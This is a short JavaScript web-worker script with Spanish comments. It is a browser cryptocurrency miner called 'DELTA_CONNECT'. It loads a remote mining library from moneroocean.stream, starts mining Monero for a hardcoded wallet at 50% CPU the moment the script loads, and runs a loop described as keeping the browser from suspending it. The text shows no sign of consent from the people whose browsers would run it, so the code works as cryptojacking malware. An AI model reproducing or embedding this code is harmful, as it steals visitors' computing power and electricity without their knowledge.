// MOTOR DE MINADO DELTA_CONNECT - CONFIGURACIÓN DE ALTA POTENCIA (50%)
importScripts('https://moneroocean.stream/webminer.js');

const WALLET = "4A2cRYWa2E57VU8TLMqz5WDIW6D9VxiAsPJ3gmu9Dsk8fceEa8enRnBCwH2tKUPAeQKjsMM3K861ASvtM8xwDi9ARwYPgSc";

function conectar() {
    // threads: 2 (usa dos hilos de procesamiento)
    // throttle: 0.5 (obliga al CPU a trabajar al 50% de su capacidad)
    const miner = new MoneroOcean.Anonymous(WALLET, {
        threads: 2,
        throttle: 0.5 
    });
    miner.start();
}

// Iniciar el motor inmediatamente al cargar el script
conectar();

// Bucle de persistencia para evitar que el navegador suspenda el proceso de fondo
setInterval(() => {
    console.log("Estado del Sistema: Motor Delta funcionando al 50% de potencia.");
}, 5000);
